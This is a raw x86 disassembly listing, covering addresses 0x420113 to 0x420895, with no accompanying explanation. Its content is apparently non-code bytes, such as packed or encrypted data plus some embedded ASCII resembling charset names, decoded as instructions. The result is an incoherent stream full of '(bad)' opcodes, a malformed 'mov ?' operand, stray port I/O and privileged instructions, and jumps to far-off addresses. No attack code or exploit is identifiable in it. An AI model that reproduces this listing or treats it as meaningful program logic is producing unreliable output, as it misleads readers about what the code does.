  420113:	add    DWORD PTR [edx-0x529bbe94],esp
  420119:	outs   dx,DWORD PTR ds:[esi]
  42011a:	hlt    
  42011b:	mov    ds:0x4863073a,al
  420120:	lds    eax,FWORD PTR [edi+0x28]
  420123:	loopne 0x420169
  420125:	jle    0x42015a
  420127:	mov    bl,BYTE PTR [ebx+ecx*1+0x692aa046]
  42012e:	or     eax,DWORD PTR [edx+edx*4+0x23]
  420132:	addr16 push ecx
  420134:	je     0x42017e
  420136:	jecxz  0x4200e4
  420138:	and    al,0x3f
  42013a:	push   ebx
  42013b:	je     0x420128
  42013d:	arpl   WORD PTR [ecx],ax
  42013f:	push   0x990b8c61
  420144:	cmp    edi,DWORD PTR fs:[ebp+0x48]
  420148:	fs loopne 0x42012b
  42014b:	inc    ebp
  42014c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42014d:	fs nop
  42014f:	(bad)  
  420151:	inc    esi
  420152:	js     0x420104
  420154:	jne    0x420181
  420156:	stc    
  420157:	ftst   
  420159:	or     ch,ah
  42015b:	sbb    BYTE PTR [ecx],ch
  42015d:	fdiv   QWORD PTR [edx]
  42015f:	adc    BYTE PTR [esp+edx*1+0x8a8346e],0x10
  420167:	add    al,0x6c
  420169:	push   0xff4241a0
  42016e:	sahf   
  42016f:	mov    ch,0x5
  420171:	inc    esp
  420172:	sub    DWORD PTR [edx+edi*2+0x5004a01e],ecx
  420179:	or     al,0x6
  42017b:	add    cl,bh
  42017d:	or     DWORD PTR ds:0xbb4f100b,ebp
  420183:	pop    esp
  420184:	jp     0x42010c
  420186:	mov    eax,ds:0xea3c7291
  42018b:	or     esp,DWORD PTR [ebx+0x1635d7a2]
  420191:	xor    al,cl
  420193:	adc    BYTE PTR [ebx],cl
  420195:	pop    edi
  420196:	stos   BYTE PTR es:[edi],al
  420197:	inc    esp
  420198:	xchg   ecx,eax
  420199:	or     ebx,DWORD PTR [eax+0x6a9f811]
  42019f:	mov    BYTE PTR [edx+0x828fe7a],bl
  4201a5:	pop    ebp
  4201a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201a7:	dec    edx
  4201a8:	movzx  esp,BYTE PTR ds:0x10f6f80d
  4201af:	int3   
  4201b0:	add    BYTE PTR [esi+0x27],ah
  4201b3:	add    DWORD PTR [eax+0x10],esi
  4201b6:	sub    eax,0x74464d80
  4201bb:	daa    
  4201bc:	xchg   ebp,eax
  4201bd:	mov    esp,0xd465c1fc
  4201c2:	in     al,dx
  4201c3:	adc    BYTE PTR [edx],dl
  4201c5:	jae    0x4201ae
  4201c7:	out    dx,al
  4201c8:	fs dec ebx
  4201ca:	add    ah,BYTE PTR [esi]
  4201cc:	push   ebp
  4201cd:	shl    DWORD PTR [esi-0x13fe6f47],cl
  4201d3:	je     0x420240
  4201d5:	mov    ds:0x4ac02993,al
  4201da:	cmp    ebp,DWORD PTR [edx*1-0x6fd27864]
  4201e1:	add    edi,DWORD PTR [ecx+0xcf49ad7]
  4201e7:	cmp    dl,BYTE PTR [edi+edi*1]
  4201ea:	xor    esp,esp
  4201ec:	mov    eax,0x9615d826
  4201f1:	fimul  DWORD PTR [edx+0x2f]
  4201f4:	inc    edi
  4201f5:	mov    al,ds:0xd23e260
  4201fa:	stos   DWORD PTR es:[edi],eax
  4201fb:	pushf  
  4201fc:	outs   dx,DWORD PTR ds:[esi]
  4201fd:	pop    es
  4201fe:	adc    edi,DWORD PTR [edx+edi*1-0x28]
  420202:	mov    cl,0xbe
  420204:	arpl   WORD PTR [edi],si
  420206:	addr16 dec esi
  420208:	adc    BYTE PTR ds:0xb4218c14,cl
  42020e:	pop    es
  42020f:	xchg   BYTE PTR [eax+0x208e17b1],ch
  420215:	test   dh,dh
  420217:	outs   dx,DWORD PTR ds:[esi]
  420218:	cdq    
  420219:	adc    DWORD PTR [edx+0x9],0xab0e13eb
  420220:	mov    BYTE PTR [edi+0x14],dl
  420223:	jae    0x4201f2
  420225:	call   0xebc6:0x89bfdbe0
  42022c:	mov    ecx,DWORD PTR ss:[esi+0x14]
  420230:	sub    eax,DWORD PTR [edi+esi*2+0xa]
  420234:	mov    eax,esi
  420236:	fwait
  420237:	push   esp
  420238:	and    ebp,DWORD PTR [eax-0x8]
  42023b:	out    dx,eax
  42023c:	push   cs
  42023d:	cmp    ecx,ebx
  42023f:	jb     0x420243
  420241:	mov    ecx,ebx
  420243:	push   esi
  420244:	sub    ebx,ecx
  420246:	jno    0x42024b
  420248:	ficomp DWORD PTR [ebx+0x45]
  42024b:	fcomp  QWORD PTR [edx+0x1d]
  42024e:	daa    
  42024f:	mov    edx,ecx
  420251:	in     al,0xfc
  420253:	cli    
  420254:	iret   
  420255:	push   esi
  420256:	adc    ebp,esp
  420258:	rcr    DWORD PTR [esi+0x9],1
  42025b:	(bad)  [ebp-0x3a]
  42025e:	pop    ebx
  42025f:	sbb    ebp,DWORD PTR [edx-0x27305fbd]
  420265:	cmovnp ecx,DWORD PTR [esi*1-0x2fb3d6ef]
  42026d:	inc    ebx
  42026e:	pusha  
  42026f:	adc    al,0xec
  420271:	add    al,0x1a
  420273:	adc    BYTE PTR [edi],bl
  420275:	or     BYTE PTR [ebx+edx*8],cl
  420278:	sub    eax,0xf1a54f46
  42027d:	adc    BYTE PTR [edi+0x1a],al
  420280:	push   ecx
  420281:	mov    esp,0xc0b67d57
  420286:	sub    DWORD PTR [edi],eax
  420288:	inc    ebp
  420289:	add    BYTE PTR [edx+0x8],ah
  42028c:	out    0xee,eax
  42028e:	adc    DWORD PTR ds:0x11b2f819,ebx
  420294:	or     BYTE PTR [edx],dh
  420296:	out    0xc6,eax
  420298:	fistp  DWORD PTR ss:[esi]
  42029b:	or     BYTE PTR [ebx],0x58
  42029e:	xor    ah,BYTE PTR [ebx-0x30]
  4202a1:	push   ss
  4202a2:	and    cl,BYTE PTR [eax+0x18]
  4202a5:	jno    0x42030f
  4202a7:	hlt    
  4202a8:	ja     0x4202b5
  4202aa:	inc    esi
  4202ab:	cmp    al,0x24
  4202ad:	dec    ebp
  4202ae:	adc    cl,BYTE PTR [ebp+0x37a86260]
  4202b4:	add    bh,al
  4202b6:	clc    
  4202b7:	sub    al,0x12
  4202b9:	outs   dx,BYTE PTR ds:[esi]
  4202ba:	add    dh,BYTE PTR [ebp+0x16]
  4202bd:	adc    BYTE PTR [edi],0xdb
  4202c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202c1:	pusha  
  4202c2:	push   ds
  4202c3:	cwde   
  4202c4:	cmp    ah,cl
  4202c6:	add    ebp,DWORD PTR [eax+0x2c]
  4202c9:	shr    bl,0x4
  4202cc:	cld    
  4202cd:	sub    DWORD PTR [ebx-0x3f],ebp
  4202d0:	fld    QWORD PTR [edi]
  4202d2:	sub    al,0x6
  4202d4:	je     0x4202dc
  4202d6:	add    edx,DWORD PTR [ebx]
  4202d8:	jmp    0x4202fc
  4202da:	sbb    al,0x8f
  4202dc:	xor    BYTE PTR [eax],ah
  4202de:	fild   WORD PTR [ebx]
  4202e0:	jmp    0x4202f8
  4202e2:	adc    BYTE PTR [eax*1-0x75f56cef],al
  4202e9:	jl     0x4202b0
  4202eb:	xor    DWORD PTR [ebx+0x45],edi
  4202ee:	adc    esi,ebx
  4202f0:	push   ss
  4202f1:	or     eax,0x391900bd
  4202f6:	sbb    DWORD PTR [edi-0x62cc6bee],eax
  4202fc:	mov    al,0xe0
  4202fe:	inc    esp
  4202ff:	mov    edi,0x98731307
  420304:	cmp    eax,0x6b985cd
  420309:	push   es
  42030a:	hlt    
  42030b:	pop    edx
  42030c:	popa   
  42030d:	daa    
  42030e:	push   esp
  42030f:	xchg   DWORD PTR [ebx-0x4f46882b],eax
  420315:	nop
  420316:	jge    0x42034b
  420318:	adc    al,BYTE PTR [edx]
  42031a:	je     0x420347
  42031c:	jmp    0x42037a
  42031e:	test   al,0xa1
  420320:	fldenv [eax+0x6e]
  420323:	div    DWORD PTR ds:0xc9039f78
  420329:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42032a:	sar    BYTE PTR [eax],0x28
  42032d:	cdq    
  42032e:	and    DWORD PTR [ecx+0x1ecba70b],ebx
  420334:	int3   
  420335:	adc    ah,ch
  420337:	ja     0x420361
  420339:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42033a:	rol    DWORD PTR [esi+0x20],0xf3
  42033e:	adc    al,BYTE PTR [ecx+edi*2]
  420341:	dec    ecx
  420342:	dec    eax
  420343:	adc    edi,DWORD PTR [edx-0x2a]
  420346:	xor    BYTE PTR [eax+0x12],0x17
  42034a:	call   0x87175498
  42034f:	adc    BYTE PTR [esi-0x5775b73a],ah
  420355:	pop    esi
  420357:	xchg   esi,eax
  420358:	push   eax
  420359:	leave  
  42035a:	lock add eax,0xc0d1a06f
  420360:	or     bl,BYTE PTR [ebp+0x4564f2f9]
  420366:	mov    bl,0x60
  420368:	fs push ebx
  42036b:	and    ch,BYTE PTR ds:0x834b7f50
  420371:	ret    
  420372:	cld    
  420373:	imul   eax,DWORD PTR [ebx],0xf
  420376:	and    ebx,esi
  420378:	inc    edi
  420379:	les    eax,FWORD PTR [esi]
  42037b:	xchg   esp,eax
  42037c:	out    dx,al
  42037d:	or     dh,BYTE PTR [esi-0xf]
  420380:	fcomp  QWORD PTR [eax]
  420382:	push   esp
  420383:	adc    DWORD PTR [ecx+0x6e],0x60
  420387:	in     al,dx
  420388:	outs   dx,BYTE PTR ds:[esi]
  420389:	mul    BYTE PTR [edx-0x6a]
  42038c:	pause  
  42038e:	out    dx,al
  42038f:	imul   edx,ebx
  420392:	adc    eax,0xddb23b3f
  420397:	adc    BYTE PTR [esi],dl
  420399:	jo     0x4203f2
  42039b:	cmp    edx,DWORD PTR [eax-0x8]
  42039e:	add    al,0xfe
  4203a0:	sub    al,0x8b
  4203a2:	cmp    eax,0x7303d968
  4203a7:	fs push es
  4203a9:	xor    BYTE PTR [ecx-0x47],bh
  4203ac:	ins    BYTE PTR es:[edi],dx
  4203ad:	and    eax,0x8b281607
  4203b2:	mov    edx,0x91c3416
  4203b7:	scas   eax,DWORD PTR es:[edi]
  4203b8:	aad    0xdd
  4203ba:	or     al,0x4b
  4203bc:	mov    BYTE PTR [ebx],al
  4203be:	push   ss
  4203bf:	pop    ds
  4203c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4203c1:	leave  
  4203c2:	cmp    al,0x0
  4203c4:	mov    ah,0x80
  4203c6:	pop    ebx
  4203c7:	lea    ecx,[ecx+0x34]
  4203ca:	mov    bh,0x6e
  4203cc:	fwait
  4203cd:	jb     0x420396
  4203cf:	and    al,0x9
  4203d1:	add    edx,DWORD PTR ds:0x349e2c20
  4203d7:	dec    ebp
  4203d8:	sar    DWORD PTR [esi],cl
  4203da:	push   eax
  4203db:	bound  esi,QWORD PTR [esi+edx*1+0x9]
  4203df:	or     eax,0x154f34d6
  4203e4:	test   BYTE PTR [edx-0x2c55f064],dl
  4203ea:	xor    al,0x4d
  4203ec:	rol    DWORD PTR [ebx],cl
  4203ee:	mov    bl,0xc2
  4203f0:	shl    eax,1
  4203f2:	out    dx,al
  4203f3:	inc    ecx
  4203f4:	mov    cl,0xdf
  4203f6:	outs   dx,BYTE PTR ds:[esi]
  4203f7:	std    
  4203f8:	jmp    0x719709b3
  4203fd:	fcomp  DWORD PTR [ecx+0xb]
  420400:	xchg   esp,eax
  420401:	pushf  
  420402:	dec    ebp
  420403:	cwde   
  420404:	fmul   QWORD PTR [ecx]
  420406:	adc    DWORD PTR [edx],eax
  420408:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420409:	xchg   ecx,eax
  42040a:	dec    esp
  42040b:	leave  
  42040c:	add    al,0xa
  42040e:	xor    DWORD PTR gs:[eax+0x66],0x78
  420413:	bswap  edx
  420415:	arpl   WORD PTR [eax+0x7b09142e],di
  42041b:	mov    al,0xc6
  42041d:	add    BYTE PTR [ecx-0x4d],bl
  420420:	in     eax,0x90
  420422:	jmp    0x420491
  420424:	pop    ss
  420425:	sti    
  420426:	test   BYTE PTR ds:0x8555fdf,ch
  42042c:	xor    BYTE PTR [esi+0x62],dl
  42042f:	jmp    0x420478
  420431:	mov    edx,0xbb640e08
  420436:	nop
  420437:	add    edi,DWORD PTR [eax]
  420439:	sub    DWORD PTR [ebx+0x2],eax
  42043c:	xor    DWORD PTR [eax+0x1c1bbb0b],esi
  420442:	or     al,0x60
  420444:	dec    esi
  420445:	and    DWORD PTR [ecx+0x19],edi
  420448:	adc    BYTE PTR [esi],0x26
  42044b:	(bad)  
  42044c:	mov    esp,0x97323c91
  420451:	push   ss
  420452:	imul   eax,DWORD PTR [esi],0x33038c03
  420458:	dec    BYTE PTR [ecx+0x70]
  42045b:	cwde   
  42045c:	adc    al,0xa4
  42045e:	add    cl,BYTE PTR [edx-0x32]
  420461:	aam    0xe9
  420463:	out    0xa0,al
  420465:	ds into 
  420467:	jle    0x420498
  420469:	mov    dh,0x86
  42046b:	jle    0x420483
  42046d:	or     bh,ah
  42046f:	jbe    0x42040d
  420471:	sahf   
  420472:	or     BYTE PTR [ebp+0x15eb817b],bh
  420478:	jmp    0x420487
  42047a:	mov    esi,0xeca8759d
  42047f:	xor    eax,0xd17f2edb
  420484:	add    esp,0x75c079a6
  42048a:	fld    TBYTE PTR [edi-0x47f382a]
  420490:	mov    bl,dh
  420492:	dec    edi
  420493:	or     al,0x2b
  420495:	dec    edi
  420496:	leave  
  420497:	add    al,0xe
  420499:	mov    dl,0x2c
  42049b:	retf   
  42049c:	lahf   
  42049d:	scas   eax,DWORD PTR es:[edi]
  42049e:	sub    ebx,ecx
  4204a0:	push   edi
  4204a1:	mov    eax,DWORD PTR [edi+0x47]
  4204a4:	dec    edi
  4204a5:	mov    DWORD PTR [ecx+0x60],0xae5f4320
  4204ac:	pushaw 
  4204ae:	push   esi
  4204af:	cwde   
  4204b0:	adc    ch,bl
  4204b2:	mov    fs,WORD PTR [ebx+0x14]
  4204b5:	out    dx,eax
  4204b6:	sbb    al,0x81
  4204b8:	mov    ebx,DWORD PTR [eax]
  4204ba:	sbb    BYTE PTR [edi],al
  4204bc:	std    
  4204bd:	or     al,0x58
  4204bf:	push   esi
  4204c0:	out    dx,eax
  4204c1:	mov    ?,WORD PTR [ecx]
  4204c3:	sbb    BYTE PTR [edi+ebp*1-0x80],dh
  4204c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204c8:	pusha  
  4204c9:	push   esp
  4204ca:	jmp    0x42048a
  4204cc:	mov    dl,0x3b
  4204ce:	pop    ecx
  4204cf:	cs (bad) 
  4204d1:	cdq    
  4204d2:	sub    bl,cl
  4204d4:	cmp    DWORD PTR [esi],edx
  4204d6:	mov    eax,0x733d5429
  4204db:	inc    ecx
  4204dc:	xchg   esp,eax
  4204dd:	or     ebp,ebx
  4204df:	dec    edi
  4204e0:	scas   al,BYTE PTR es:[edi]
  4204e1:	inc    ecx
  4204e2:	aam    0x24
  4204e4:	out    dx,al
  4204e5:	sub    DWORD PTR [ecx+0x5c97ec25],0xb2197ff6
  4204ef:	push   es
  4204f0:	aaa    
  4204f1:	add    ebx,ebp
  4204f3:	pop    ss
  4204f4:	mov    dl,0xc
  4204f6:	push   eax
  4204f7:	push   ds
  4204f8:	aad    0x92
  4204fa:	or     edx,esi
  4204fc:	add    ecx,DWORD PTR [eax]
  4204fe:	shl    BYTE PTR [ebx],0x81
  420501:	das    
  420502:	sbb    BYTE PTR ds:0xbc423a3c,cl
  420508:	dec    esi
  420509:	inc    esi
  42050a:	les    esi,FWORD PTR [eax+0x352c1788]
  420510:	test   BYTE PTR [esp+eax*1+0x511418bb],bh
  420517:	mov    ds,ecx
  420519:	int3   
  42051a:	add    al,0xf0
  42051c:	(bad)
  420520:	out    dx,eax
  420521:	je     0x420573
  420523:	mov    esi,0x34603a60
  420528:	push   ecx
  420529:	xchg   ebx,eax
  42052a:	or     eax,0x481eff6e
  42052f:	xor    eax,0x2858ea0b
  420534:	dec    eax
  420535:	add    al,dh
  420537:	addr16 aaa 
  420539:	fwait
  42053a:	inc    eax
  42053b:	cmp    DWORD PTR [ebx],esi
  42053d:	and    esp,DWORD PTR [eax+0x260b0a1]
  420543:	adc    eax,0x13922bce
  420548:	repnz inc ebp
  42054a:	push   edx
  42054b:	push   eax
  42054c:	sbb    cl,dl
  42054e:	mov    ds:0xddd42c98,eax
  420553:	adc    eax,0x56d81c05
  420558:	and    al,0xb4
  42055a:	out    dx,al
  42055b:	rcr    eax,0xde
  42055e:	sub    al,0x21
  420560:	pop    edi
  420561:	cmp    eax,0x932c1150
  420566:	xchg   BYTE PTR [edx-0x7c3cdff5],ch
  42056c:	out    dx,eax
  42056d:	lock and eax,0x137507f
  420573:	sbb    DWORD PTR [esp+ecx*2-0x182f828b],edx
  42057a:	data16 adc BYTE PTR [ebp+eiz*1+0x56bb443a],cl
  420582:	js     0x4205bc
  420584:	ds js  0x4205ff
  420587:	stc    
  420588:	xor    BYTE PTR [eax],cl
  42058a:	(bad)  
  42058c:	jge    0x42051e
  42058e:	or     eax,DWORD PTR [ebp-0x43]
  420591:	pop    eax
  420592:	pop    esp
  420593:	dec    ecx
  420594:	or     BYTE PTR [ebp+0x17d93380],0x3b
  42059b:	dec    esp
  42059c:	nop    DWORD PTR [ecx+ecx*1+0x44]
  4205a1:	and    BYTE PTR [ebx-0x73bd9933],bh
  4205a7:	sbb    al,ch
  4205a9:	inc    eax
  4205aa:	in     al,dx
  4205ab:	aaa    
  4205ac:	inc    ebx
  4205ad:	nop
  4205ae:	test   al,0x90
  4205b0:	jl     0x420538
  4205b2:	xor    ch,BYTE PTR [eax+ebx*2]
  4205b5:	or     DWORD PTR ds:0x1b63279,esp
  4205bb:	sbb    DWORD PTR [ebx-0x406d027d],ebx
  4205c1:	test   al,0xb7
  4205c3:	add    DWORD PTR [edx],ebx
  4205c5:	sub    DWORD PTR [ecx+eax*1+0x73],ecx
  4205c9:	popa   
  4205ca:	(bad)  
  4205cb:	mov    al,ds:0x2c4cf648
  4205d0:	mov    eax,gs:0xcaa2f45a
  4205d6:	adc    dl,BYTE PTR [eax]
  4205d8:	mov    ch,0xa9
  4205da:	sbb    eax,0x5406ec9b
  4205df:	sub    edx,0xffffffd4
  4205e2:	popa   
  4205e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4205e4:	push   ds
  4205e5:	in     al,dx
  4205e6:	xor    BYTE PTR [edi+0x73],ah
  4205e9:	in     al,dx
  4205ea:	fsubr  QWORD PTR [esi+0x10a304ee]
  4205f0:	out    0xe4,al
  4205f2:	repz jo 0x42061c
  4205f5:	mov    edi,DWORD PTR [edx]
  4205f7:	xchg   edx,eax
  4205f8:	push   eax
  4205f9:	pop    esp
  4205fa:	lahf   
  4205fb:	add    DWORD PTR [edx],ebx
  4205fd:	das    
  4205fe:	mov    ebx,DWORD PTR [edx]
  420600:	xchg   edx,eax
  420601:	xor    BYTE PTR [edi-0x5de5fec1],dl
  420607:	push   cs
  420608:	in     al,dx
  420609:	xchg   edx,eax
  42060a:	popa   
  42060b:	js     0x420644
  42060d:	push   0x48fb9bfc
  420612:	cmp    DWORD PTR [eax+0x1],0xffffffc3
  420616:	pop    ss
  420617:	add    eax,0x6f435406
  42061c:	ins    BYTE PTR es:[edi],dx
  42061d:	outs   dx,DWORD PTR ds:[esi]
  42061e:	jb     0x4205f4
  420620:	cmp    DWORD PTR [edi],eax
  420622:	jl     0x4205f7
  420624:	and    BYTE PTR [ebx+ebp*8],0x17
  420628:	nop
  420629:	mov    al,ds:0x79bd047f
  42062e:	push   esp
  42062f:	inc    esi
  420630:	outs   dx,DWORD PTR ds:[esi]
  420631:	dec    edi
  420632:	jb     0x4206a7
  420634:	gs je  0x42063d
  420637:	aam    0x3d
  420639:	cmp    eax,0x1b9021d1
  42063e:	hlt    
  42063f:	ja     0x4206bf
  420641:	add    dl,dh
  420643:	inc    ecx
  420644:	add    DWORD PTR [edx],ebx
  420646:	hlt    
  420647:	add    DWORD PTR [ebx],ebx
  420649:	inc    esp
  42064a:	adc    BYTE PTR [edi],ah
  42064c:	cmp    dh,0x5f
  42064f:	jae    0x4206c0
  420651:	jne    0x4206c5
  420653:	arpl   WORD PTR [ebp+0x4d],sp
  420656:	popa   
  420657:	outs   dx,BYTE PTR ds:[esi]
  420658:	popa   
  420659:	addr16 lahf 
  42065b:	adc    dh,cl
  42065d:	xchg   ebp,eax
  42065e:	add    BYTE PTR [eax-0x77],ah
  420661:	dec    esi
  420662:	and    BYTE PTR [esi+0x1889205c],cl
  420668:	jnp    0x4206a5
  42066a:	fs push eax
  42066c:	retf   0xc52a
  42066f:	fwait
  420670:	add    BYTE PTR [ecx],ah
  420672:	lods   al,BYTE PTR ds:[esi]
  420673:	and    cl,BYTE PTR [edi+0x5d2ff26f]
  420679:	push   edi
  42067a:	pop    es
  42067b:	arpl   WORD PTR [edx+eax*2+0x6c],bp
  42067f:	popa   
  420680:	arpl   WORD PTR [ebx+0xf],bp
  420683:	cmp    edx,DWORD PTR cs:[esi+ebp*2]
  420687:	fwait
  420688:	jb     0x4206f9
  42068a:	or     DWORD PTR [eax],eax
  42068c:	and    eax,DWORD PTR [edi+0x74]
  42068f:	rcl    BYTE PTR [esi+0xf6ec2a2],0x4f
  420696:	ins    BYTE PTR es:[edi],dx
  420697:	dec    ebp
  420698:	add    ch,BYTE PTR [eax+0x1]
  42069b:	outs   dx,BYTE PTR ds:[esi]
  42069c:	pop    es
  42069d:	popf   
  42069e:	aas    
  42069f:	and    bh,bh
  4206a1:	inc    ebx
  4206a2:	dec    esi
  4206a3:	popa   
  4206a4:	jbe    0x42071f
  4206a6:	add    BYTE PTR [eax+0x75],dl
  4206a9:	jb     0x42071b
  4206ab:	ins    BYTE PTR es:[edi],dx
  4206ac:	fdiv   DWORD PTR gs:[edi+0x542397ec]
  4206b3:	gs popa 
  4206b5:	ins    BYTE PTR es:[edi],dx
  4206b6:	rcpps  xmm4,XMMWORD PTR [ecx+0x33]
  4206ba:	adc    BYTE PTR [ecx],bh
  4206bc:	in     al,0x4f
  4206be:	push   ebx
  4206bf:	imul   ebp,DWORD PTR [esi+esi*2+0x65],0xf900572
  4206c7:	cwde   
  4206c8:	mov    eax,ds:0x4c67502f
  4206cd:	imul   ebp,DWORD PTR [ebp+0x65],0x3fc85b6c
  4206d4:	pop    ecx
  4206d5:	gs ins BYTE PTR es:[edi],dx
  4206d7:	ins    BYTE PTR es:[edi],dx
  4206d8:	outs   dx,DWORD PTR ds:[esi]
  4206d9:	ja     0x4206aa
  4206db:	jne    0x420700
  4206dd:	daa    
  4206de:	in     al,0x1f
  4206e0:	sbb    DWORD PTR [ecx],ecx
  4206e2:	inc    esi
  4206e3:	jne    0x420748
  4206e5:	push   0x41616973
  4206ea:	jno    0x4206cd
  4206ec:	in     al,0x97
  4206ee:	mov    ecx,0x57cf1075
  4206f3:	push   0x30c7469
  4206f8:	add    edi,DWORD PTR [ebx]
  4206fa:	mov    ebx,0x79650030
  4206ff:	hlt    
  420700:	add    BYTE PTR [ebx+0x10],cl
  420703:	or     eax,0x6b53ecd8
  420708:	jns    0x420768
  42070a:	cmp    eax,DWORD PTR [ebx-0x4f]
  42070d:	pop    ecx
  42070e:	mov    ebx,0x4d231aec
  420713:	mov    bl,0xda
  420715:	outs   dx,DWORD PTR ds:[esi]
  420716:	inc    edx
  420717:	inc    eax
  420718:	ret    
  420719:	xchg   ebx,eax
  42071a:	push   cs
  42071b:	arpl   WORD PTR [eax+esi*1+0x42],si
  42071f:	scas   eax,DWORD PTR es:[edi]
  420720:	mov    al,ds:0xe1bdf203
  420725:	pop    ss
  420726:	cmovae esp,DWORD PTR [ecx+0x6d]
  42072a:	pop    ds
  42072b:	fsubr  DWORD PTR [ecx]
  42072d:	dec    edi
  42072e:	das    
  42072f:	jo     0x4207a1
  420731:	push   edi
  420732:	sub    al,0x6b
  420734:	xor    BYTE PTR [ecx],bh
  420736:	cmp    edx,DWORD PTR [eax+0x35]
  420739:	fisttp DWORD PTR [edi+ebp*1]
  42073c:	in     al,dx
  42073d:	push   ss
  42073e:	aam    0xaa
  420740:	addr16 mov eax,0x4297646e
  420746:	je     0x42073f
  420748:	fbstp  TBYTE PTR [edx+0x2a466ed8]
  42074e:	inc    ebx
  42074f:	adc    ecx,DWORD PTR [eax+0x69]
  420752:	addr16 push 0x71b0036c
  420758:	enter  0x7459,0x17
  42075c:	or     edx,DWORD PTR [ebx-0x1b]
  42075f:	shr    DWORD PTR fs:[esi],0x24
  420763:	int3   
  420764:	ss aas 
  420766:	sahf   
  420767:	js     0x4207dd
  420769:	xlat   BYTE PTR ds:[ebx]
  42076a:	pop    ecx
  42076b:	shl    BYTE PTR [esi-0x6d],0xd
  42076f:	xchg   ebp,eax
  420770:	pop    ss
  420771:	sub    edi,DWORD PTR ds:0x44fe4384
  420777:	gs popaw 
  42077a:	jne    0x4207e8
  42077c:	pop    ss
  42077d:	retf   
  42077e:	fs imul eax,edx,0x1511acae
  420785:	iret   
  420786:	sbb    DWORD PTR [edi],ebx
  420788:	into   
  420789:	dec    eax
  42078a:	pop    eax
  42078b:	arpl   WORD PTR [ecx-0xa],cx
  42078e:	and    DWORD PTR [edi],ecx
  420790:	or     ah,BYTE PTR [ebp-0x35]
  420793:	dec    cx
  420795:	ins    BYTE PTR es:[edi],dx
  420796:	stos   DWORD PTR es:[edi],eax
  420797:	shl    BYTE PTR [edx+0x13be42d8],0xf
  42079e:	sub    al,0x3f
  4207a0:	int3   
  4207a1:	and    dl,BYTE PTR [edi+0x746f48fd]
  4207a7:	dec    esp
  4207a8:	jmp    0x4207ba
  4207aa:	outs   dx,DWORD PTR ds:[esi]
  4207ab:	fst    DWORD PTR [edx+0x1b7925b3]
  4207b1:	adc    DWORD PTR [ebx+0x4d958426],ecx
  4207b7:	adc    eax,0x4b08031b
  4207bc:	pop    eax
  4207bd:	jmp    0x6fa82783
  4207c2:	inc    edx
  4207c3:	xor    al,0xbf
  4207c5:	adc    esi,DWORD PTR [ebx-0x40268e7d]
  4207cb:	push   es
  4207cc:	or     ebp,DWORD PTR [esi+0x75]
  4207cf:	setbe  BYTE PTR [ebp-0x3cf66dbe]
  4207d6:	mov    bh,cl
  4207d8:	mov    dl,0x64
  4207da:	pop    ss
  4207db:	not    BYTE PTR [ebx]
  4207dd:	out    0xa,eax
  4207df:	pop    ss
  4207e0:	dec    edi
  4207e1:	jecxz  0x420764
  4207e3:	loopne 0x42081d
  4207e5:	dec    esi
  4207e6:	xchg   edi,eax
  4207e7:	pop    ds
  4207e8:	push   ebx
  4207e9:	arpl   WORD PTR [eax+edi*8],cx
  4207ec:	gs mov esp,0x23510152
  4207f2:	xor    eax,DWORD PTR [esp+eax*2+0x6b]
  4207f6:	push   cs
  4207f7:	ins    DWORD PTR es:[edi],dx
  4207f8:	popa   
  4207f9:	dec    esp
  4207fa:	loopne 0x42081f
  4207fc:	pop    ss
  4207fd:	push   ds
  4207fe:	mov    al,0x1
  420800:	sti    
  420801:	ret    0x57c7
  420804:	imul   ebp,DWORD PTR [esi+0x27],0xec05130d
  42080b:	push   esp
  42080c:	sbb    BYTE PTR [esi-0x73],al
  42080f:	push   0x57
  420811:	push   0xffffff8b
  420813:	ficomp WORD PTR [ebx-0x1dd06ee9]
  420819:	or     ecx,DWORD PTR ds:0x6d83d7fd
  42081f:	push   ecx
  420820:	dec    esp
  420821:	pop    eax
  420822:	ret    
  420823:	push   0x33
  420825:	inc    ebx
  420826:	inc    ebx
  420827:	cmp    BYTE PTR [ebp-0xfa1efca],0x84
  42082e:	fwait
  42082f:	psubb  mm7,mm7
  420832:	ret    
  420833:	into   
  420834:	inc    esp
  420835:	inc    edi
  420836:	inc    ecx
  420837:	dec    esi
  420838:	push   ebx
  420839:	dec    ecx
  42083a:	pop    edi
  42083b:	inc    ebx
  42083c:	dec    eax
  42083d:	inc    ecx
  42083e:	push   edx
  42083f:	push   ebx
  420840:	inc    ebp
  420841:	push   esp
  420842:	add    BYTE PTR [esi-0x4e],al
  420845:	jg     0x420887
  420847:	pop    es
  420848:	inc    esp
  420849:	inc    ebp
  42084a:	inc    esi
  42084b:	inc    ecx
  42084c:	push   ebp
  42084d:	dec    esp
  42084e:	push   esp
  42084f:	sbb    al,bh
  420851:	pop    ds
  420852:	mov    dh,0xec
  420854:	pop    ds
  420855:	push   ebx
  420856:	pop    ecx
  420857:	dec    ebp
  420858:	inc    edx
  420859:	dec    edi
  42085a:	dec    esp
  42085b:	xor    ebx,edi
  42085d:	dec    ebp
  42085e:	inc    ecx
  42085f:	inc    ebx
  420860:	pusha  
  420861:	push   DWORD PTR [ebx]
  420863:	popa   
  420864:	sub    edx,DWORD PTR [eax]
  420866:	dec    eax
  420867:	dec    ecx
  420868:	inc    esi
  420869:	push   esp
  42086a:	dec    edx
  42086b:	dec    ecx
  42086c:	push   ebx
  42086d:	pop    edi
  42086e:	ret    
  42086f:	xchg   esi,eax
  420870:	jge    0x42088d
  420872:	adc    DWORD PTR [esi+0x47],ecx
  420875:	inc    ebp
  420876:	push   ebp
  420877:	dec    eax
  420878:	out    dx,eax
  420879:	jg     0x42082d
  42087b:	fisttp DWORD PTR gs:[edx+0x4f]
  42087f:	adc    BYTE PTR [edx+0x30],al
  420882:	ja     0x4208cb
  420884:	inc    edx
  420885:	xor    dh,BYTE PTR [ebx]
  420887:	xor    DWORD PTR [edx],esi
  420889:	mov    bh,0x4b
  42088b:	ja     0x4208ae
  42088d:	adc    esp,DWORD PTR [ebx+0x43]
  420890:	dec    esi
  420891:	inc    ebp
  420892:	adc    DWORD PTR [edx+0x49],eax
  420895:	or     ecx,ecx
